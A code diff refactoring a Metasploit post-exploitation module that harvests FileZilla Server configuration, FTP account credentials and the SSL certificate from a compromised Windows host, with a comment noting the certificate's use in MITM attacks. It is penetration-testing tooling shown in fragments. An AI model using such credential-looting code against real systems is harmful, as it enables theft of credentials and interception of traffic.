@@ -7,7 +7,7 @@ require 'msf/core'
 require 'rex'
 require 'rexml/document'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   include Msf::Post::File
 
@@ -68,7 +68,7 @@ class Metasploit3 < Msf::Post
     end
 
     if !paths.empty?
-      print_good("Found FileZilla Server on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
+      print_good("Found FileZilla Server on #{sysinfo['Computer']} via session ID: #{session.sid}")
       print_line
       return paths
     end
@@ -321,17 +321,14 @@ class Metasploit3 < Msf::Post
     end
     settings['ftp_bindip'] = "0.0.0.0" if settings['ftp_bindip'] == "*" || settings['ftp_bindip'].empty?
 
-    if settings['ssl'] == "1"
-      settings['ssl'] = "true"
-    else
-      if datastore['SSLCERT']
-        print_error("Cannot loot the SSL Certificate, SSL is disabled in the configuration file")
-      end
-      settings['ssl'] = "false"
+    settings['ssl'] = settings['ssl'] == "1"
+    if !settings['ssl'] && datastore['SSLCERT']
+      print_error("Cannot loot the SSL Certificate, SSL is disabled in the configuration file")
     end
 
     settings['ssl_certfile'] = items[45].text rescue "<none>"
-    if settings['ssl_certfile'] != "<none>" and settings['ssl'] == "true" and datastore['SSLCERT'] # lets get the file if its there could be useful in MITM attacks
+    # Get the file if it is there. It could be useful in MITM attacks
+    if settings['ssl_certfile'] != "<none>" && settings['ssl'] and datastore['SSLCERT']
       sslfile = session.fs.file.new(settings['ssl_certfile'])
       until sslfile.eof?
         sslcert << sslfile.read
@@ -386,7 +383,7 @@ class Metasploit3 < Msf::Post
 
       account['host'] = settings['ftp_bindip']
       account['port'] = settings['ftp_port']
-      account['ssl']  = settings['ssl']
+      account['ssl']  = settings['ssl'].to_s
       creds << account
 
       vprint_status("    Username: #{account['user']}")
